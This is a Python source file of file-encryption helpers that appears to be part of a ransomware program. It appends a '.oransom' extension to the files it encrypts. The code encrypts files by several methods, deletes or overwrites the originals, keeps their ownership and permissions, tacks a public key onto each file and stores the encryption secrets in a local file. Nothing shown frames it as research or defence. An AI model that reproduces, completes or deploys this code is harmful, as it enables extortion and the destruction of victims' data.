from Crypto.Util.Padding import pad,unpad
from Crypto.Cipher._mode_ecb import EcbMode
from Crypto.Cipher._mode_cbc import CbcMode
import os
import stat
import crypto

def read_file_pubkey(filename, key_len=32):
    with open(filename, 'r+b') as f:
        f.seek(0, os.SEEK_END)
        file_size = f.tell()
        seek_pos = max(0, file_size-key_len)
        f.seek(seek_pos)
        pubkey = f.read(key_len)
        f.seek(seek_pos)
        f.truncate()
        return pubkey

def write_file_pubkey(filename, pubkey):
    with open(filename, 'r+b') as f:
        f.seek(0, os.SEEK_END)
        f.write(pubkey)

def get_file_attrs(filename):
    source_stat = os.stat(filename)
    uid = source_stat.st_uid
    gid = source_stat.st_gid
    mode = stat.S_IMODE(source_stat.st_mode)
    return uid, gid, mode

def write_newfile(file, data, uid, gid, mode):
    with open(file, 'wb') as f:
        f.write(data)
    try:
        os.chown(file, uid, gid)
        os.chmod(file, mode)
    except Exception as e:
        print(file)
        raise e

def save_secrets(secret, pubkey):
    with open("file_keys.out", "wb") as f:
        f.write(secret)
        f.write(pubkey)

def read_secrets():
    iv_len = 16
    pubkey_len = 32
    with open("file_keys.out", "rb") as f:
        lines = f.read()
        iv = lines[:iv_len]
        secret = lines[iv_len:-1*pubkey_len]
        pubkey = crypto.publicKey(lines[-1*pubkey_len:])
        return iv, secret, pubkey

def _outfile(filename):
    if '.oransom' in filename:
        return filename[:-8]
    else:
        return filename+'.oransom'

def encrypt_file_writebefore(filename, cipher, ext, blocksize=16, needPad=False, needUnpad=False):
    ifile = filename
    ofile = _outfile(filename)
    uid, gid, mode = get_file_attrs(ifile)
    
    with open(ifile, 'rb') as f:
        data = f.read()
        ciphertext = crypto.encrypt_data(data, cipher, blocksize, needPad, needUnpad)
        write_newfile(ofile, ciphertext, uid, gid, mode)
    os.remove(ifile)
    return ofile

def encrypt_file_writeafter(filename, cipher, ext, blocksize=16, needPad=False, needUnpad=False): 
    ifile = filename
    uid, gid, mode = get_file_attrs(ifile)
    ct_complete = bytearray()
    
    with open(ifile, 'rb') as f:
        data = f.read()
        ciphertext = crypto.encrypt_data(data, cipher, blocksize, needPad, needUnpad)
    os.remove(ifile)
    if ext:
        ofile = _outfile(filename)
    else:
        ofile = ifile
    write_newfile(ofile, ciphertext, uid, gid, mode)
    return ofile

def encrypt_file_inplace(filename, cipher, ext, blocksize=16, needPad=False, needUnpad=False):
    ifile = filename
    with open(ifile, 'r+b') as f:
        data = f.read()
        ciphertext = crypto.encrypt_data(data, cipher, blocksize, needPad, needUnpad)
        
        f.seek(0)
        f.write(ciphertext)
        f.truncate()
    if ext:
        ofile = _outfile(filename) 
        os.rename(ifile, ofile)
        return ofile
    return ifile
